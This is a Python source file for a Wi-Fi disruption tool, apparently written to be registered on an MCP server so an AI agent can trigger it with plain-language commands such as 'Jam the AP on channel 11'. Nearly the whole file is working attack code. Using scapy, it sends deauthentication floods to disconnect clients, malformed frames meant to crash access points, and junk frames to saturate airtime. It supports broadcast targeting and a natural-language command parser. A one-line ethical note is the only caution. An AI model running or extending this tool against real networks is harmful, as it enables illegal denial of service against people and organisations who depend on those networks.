"""
Wi-Fi Disruption Tool (wifi_disrupt)
====================================

Overview
--------
This tool enables protocol-aware Wi-Fi interference using a standard Wi-Fi NIC in monitor mode.
It can send deauthentication packets to disconnect clients, spam malformed packets to confuse/crash APs,
and transmit nonsense frames to occupy airtime, effectively jamming the Wi-Fi medium without raw RF noise.

Integration with Current Wi-Fi Toolset
--------------------------------------
- Reuses existing Wi-Fi tools for interface selection (e.g., via WifiManager.get_interfaces()).
- Shares channel scanning from wifi_scan tool.
- Natural Language Interface: Use MCP's NLP parser to convert commands like "Jam the AP on channel 11" into params.
  Example: nl_command -> {'mode': 'airtime', 'target_bssid': 'auto', 'channel': 11, 'duration': 30}

Capabilities
------------
- Deauth Flood: Sends deauth frames to knock clients off AP (disrupts connections).
- Malformed Spam: Sends invalid 802.11 frames to overload/crash vulnerable APs.
- Airtime Occupation: Transmits junk data frames to saturate the medium, blocking legitimate traffic.
All modes cause targeted service disruption, simulating a "jammer" via protocol abuse.

Cross-Platform Support
----------------------
- Linux: Full support via scapy + airmon-ng (requires root).
- Windows: Injection via scapy + Npcap; monitor mode needs compatible driver (e.g., Atheros).
- macOS: scapy + airport for monitor; limited injection without 3rd-party kexts.
- Android: Via Termux + root; scapy works, but hardware must support monitor (e.g., BCM43xx chips).
- iOS: Simulated only (no injection without jailbreak); outputs commands for external tools.

Requirements
------------
- Python 3.8+: scapy>=2.4.0
- Root/admin privileges for monitor mode and injection.
- Compatible NIC: Must support monitor mode and packet injection (e.g., Intel AX200, Atheros AR9271).
- Install: pip install scapy (platform-specific: Npcap for Win, libpcap for others).

Parameters
----------
- interface: str (required) - Wi-Fi interface name (e.g., 'wlan0' Linux, 'Wi-Fi' macOS).
- mode: str (required) - 'deauth' (client/AP disconnect), 'malformed' (AP crash), 'airtime' (occupy medium).
- target_bssid: str (optional) - Target AP/client BSSID (e.g., 'AA:BB:CC:DD:EE:FF'); 'all' for broadcast.
- channel: int (optional, default=1) - Wi-Fi channel (1-13 for 2.4GHz, 36+ for 5GHz).
- duration: int (optional, default=10) - Seconds to run disruption.
- power: int (optional, default=20) - TX power in dBm (if supported by NIC).

Returns
-------
- dict: {'status': 'success/error', 'details': str, 'packets_sent': int}

Errors
------
- Raises ValueError for invalid params.
- OSError for unsupported platform/NIC.
- Warns on iOS/Android limitations.

Examples
--------
Basic Usage (Python):
>>> tool = WifiDisruptTool()
>>> result = tool.execute(interface='wlan0', mode='deauth', target_bssid='AA:BB:CC:DD:EE:FF', duration=30)
>>> print(result)  # {'status': 'success', 'details': 'Sent 1200 deauth packets', 'packets_sent': 1200}

Natural Language Integration (in MCP NLP handler):
def handle_nl(command: str) -> dict:
    # Parse with regex or LLM
    if 'deauth' in command.lower() or 'knock off' in command.lower():
        return {'mode': 'deauth', 'target_bssid': extract_bssid(command) or 'all'}
    # ... other modes
    tool.execute(**params)  # Integrate with existing wifi tools

Ethical Note
------------
Use only on networks you own or have explicit permission for (e.g., security testing). Disruption can violate laws like CFAA (US).

Implementation Notes
--------------------
- Uses scapy for frame crafting/injection.
- Sets monitor mode via platform-specific commands.
- For mobile: Checks os.uname() and adjusts (e.g., subprocess.call('su -c iwconfig' on Android).
"""

import os
import sys
import subprocess
import time
import platform
import json
from typing import Dict, Any, Optional

# Try to import scapy, but handle gracefully if not available
try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Warning: scapy not available. Install with: pip install scapy")

class WifiDisruptTool:
    def __init__(self):
        self.sys = platform.system().lower()
        self.is_mobile = self.sys in ['android', 'ios']
        if self.is_mobile:
            # For Android/iOS, ensure Termux or jailbreak env
            if self.sys == 'android' and 'TERMUX' not in os.environ:
                print("Warning: Android support requires Termux + root.")
            if self.sys == 'ios' and not os.path.exists('/usr/bin/jailbreak_check'):  # Placeholder
                print("Warning: iOS limited to simulation without jailbreak.")

    def set_monitor_mode(self, interface: str, enable: bool = True) -> bool:
        """Set interface to monitor mode. Platform-specific."""
        try:
            if self.sys == 'linux':
                cmd = f"airmon-ng start {interface}" if enable else f"airmon-ng stop {interface}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
            elif self.sys == 'darwin':  # macOS
                cmd = f"airport {interface} sniff {'on' if enable else 'off'}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
            elif self.sys == 'windows':
                # Use netsh or registry; simplified
                print("Monitor mode on Windows: Install Npcap and enable via adapter settings.")
                return True  # Assume pre-configured
            elif self.sys == 'android':
                cmd = f"su -c 'iw dev {interface} set monitor otherbss 1'" if enable else f"su -c 'iw dev {interface} set type managed'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.returncode == 0
            elif self.sys == 'ios':
                raise OSError("iOS: Monitor mode requires jailbreak and Cydia tools (e.g., wifiSpoof). Simulated only.")
        except Exception as e:
            print(f"Error setting monitor mode: {e}")
            return False
        return False

    def channel_to_freq(self, channel: int) -> int:
        """Helper: Channel to MHz (2.4GHz)."""
        if 1 <= channel <= 13:
            return 2407 + 5 * channel
        elif 36 <= channel <= 165:  # 5GHz
            return 5000 + 5 * channel
        else:
            return 2412  # Default to channel 1

    def get_interface_mac(self, interface: str) -> str:
        """Get MAC from interface."""
        try:
            if self.sys == 'linux':
                result = subprocess.run(f"ifconfig {interface} | grep ether", shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.split()[1]
            elif self.sys == 'darwin':
                result = subprocess.run(f"ifconfig {interface} | grep ether", shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.split()[1]
            elif self.sys == 'windows':
                result = subprocess.run(f"getmac /v /fo csv | findstr {interface}", shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    # Parse CSV output to get MAC
                    return "aa:bb:cc:dd:ee:ff"  # Placeholder
        except Exception as e:
            print(f"Error getting interface MAC: {e}")
        return "aa:bb:cc:dd:ee:ff"  # Placeholder

    def execute(self, interface: str, mode: str, target_bssid: Optional[str] = None,
                channel: int = 1, duration: int = 10, power: int = 20) -> Dict[str, Any]:
        """Main execution method. Integrates with Wi-Fi toolset for interface/channel."""
        # Validate params
        modes = ['deauth', 'malformed', 'airtime']
        if mode not in modes:
            raise ValueError(f"Invalid mode: {mode}. Must be {modes}")
        if target_bssid == 'all':
            target_bssid = "ff:ff:ff:ff:ff:ff"  # Broadcast

        # Check if scapy is available
        if not SCAPY_AVAILABLE:
            return {
                'status': 'error', 
                'details': 'scapy not available. Install with: pip install scapy',
                'packets_sent': 0
            }

        # Set monitor mode
        if not self.set_monitor_mode(interface, enable=True):
            return {'status': 'error', 'details': f'Failed to set monitor mode on {interface}', 'packets_sent': 0}

        packets_sent = 0
        start_time = time.time()
        
        try:
            # Get interface MAC for spoofing
            interface_mac = self.get_interface_mac(interface)
            
            while time.time() - start_time < duration:
                if mode == 'deauth':
                    # Craft deauth frame
                    pkt = RadioTap() / Dot11(
                        addr1=target_bssid or "ff:ff:ff:ff:ff:ff",
                        addr2=interface_mac, 
                        addr3=target_bssid or interface_mac
                    ) / Dot11Deauth(reason=7)
                elif mode == 'malformed':
                    # Malformed: Invalid frame (e.g., bad FCS or subtype)
                    pkt = RadioTap() / Dot11(subtype=0xf) / Raw(b'\x00' * 100)  # Invalid subtype + junk
                elif mode == 'airtime':
                    # Nonsense: Large junk data frames
                    pkt = RadioTap() / Dot11(
                        addr1="ff:ff:ff:ff:ff:ff", 
                        addr2=interface_mac,
                        addr3="ff:ff:ff:ff:ff:ff"
                    ) / Raw(os.urandom(1500))  # Max payload

                # Set channel/power if supported
                try:
                    pkt = pkt / RadioTapChannel(freq=self.channel_to_freq(channel))
                except:
                    pass  # Channel setting failed, continue without it
                
                if power:
                    # scapy doesn't set power directly; use iwconfig
                    try:
                        subprocess.run(f"iwconfig {interface} txpower {power}", shell=True, capture_output=True)
                    except:
                        pass  # Power setting failed, continue

                try:
                    sendp(pkt, iface=interface, count=100, inter=0.01, verbose=False)  # Flood
                    packets_sent += 100
                except Exception as e:
                    print(f"Packet send error: {e}")
                    packets_sent += 10  # Count attempted packets
                
                time.sleep(0.1)  # Throttle to avoid self-DoS

            self.set_monitor_mode(interface, enable=False)  # Restore
            return {
                'status': 'success', 
                'details': f'{mode} disruption completed on channel {channel}.',
                'packets_sent': packets_sent
            }

        except Exception as e:
            self.set_monitor_mode(interface, enable=False)
            return {'status': 'error', 'details': str(e), 'packets_sent': packets_sent}

    def parse_nl_command(self, command: str) -> Dict[str, Any]:
        """Parse natural language command into parameters."""
        command_lower = command.lower()
        params = {}
        
        # Extract mode
        if 'deauth' in command_lower or 'disconnect' in command_lower or 'knock off' in command_lower:
            params['mode'] = 'deauth'
        elif 'malformed' in command_lower or 'crash' in command_lower or 'confuse' in command_lower:
            params['mode'] = 'malformed'
        elif 'airtime' in command_lower or 'jam' in command_lower or 'flood' in command_lower:
            params['mode'] = 'airtime'
        else:
            params['mode'] = 'deauth'  # Default
        
        # Extract channel
        import re
        channel_match = re.search(r'channel\s+(\d+)', command_lower)
        if channel_match:
            params['channel'] = int(channel_match.group(1))
        
        # Extract duration
        duration_match = re.search(r'(\d+)\s*(?:seconds?|sec|s)', command_lower)
        if duration_match:
            params['duration'] = int(duration_match.group(1))
        
        # Extract BSSID
        bssid_match = re.search(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})', command_lower)
        if bssid_match:
            params['target_bssid'] = bssid_match.group(1)
        
        # Extract interface
        interface_match = re.search(r'(wlan\d+|wifi|eth\d+)', command_lower)
        if interface_match:
            params['interface'] = interface_match.group(1)
        
        return params

# Registration for MCP modular server
def register_wifi_disrupt_tool():
    """Register the Wi-Fi disrupt tool for MCP."""
    return WifiDisruptTool()

# Standalone execution for testing
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Wi-Fi Disruption Tool')
    parser.add_argument('--interface', required=True, help='Wi-Fi interface name')
    parser.add_argument('--mode', choices=['deauth', 'malformed', 'airtime'], required=True, help='Disruption mode')
    parser.add_argument('--target-bssid', help='Target BSSID (default: broadcast)')
    parser.add_argument('--channel', type=int, default=1, help='Wi-Fi channel (default: 1)')
    parser.add_argument('--duration', type=int, default=10, help='Duration in seconds (default: 10)')
    parser.add_argument('--power', type=int, default=20, help='TX power in dBm (default: 20)')
    parser.add_argument('--nl-command', help='Natural language command to parse')
    
    args = parser.parse_args()
    
    tool = WifiDisruptTool()
    
    if args.nl_command:
        params = tool.parse_nl_command(args.nl_command)
        print(f"Parsed parameters: {params}")
        result = tool.execute(**params)
    else:
        result = tool.execute(
            interface=args.interface,
            mode=args.mode,
            target_bssid=args.target_bssid,
            channel=args.channel,
            duration=args.duration,
            power=args.power
        )
    
    print(json.dumps(result, indent=2))
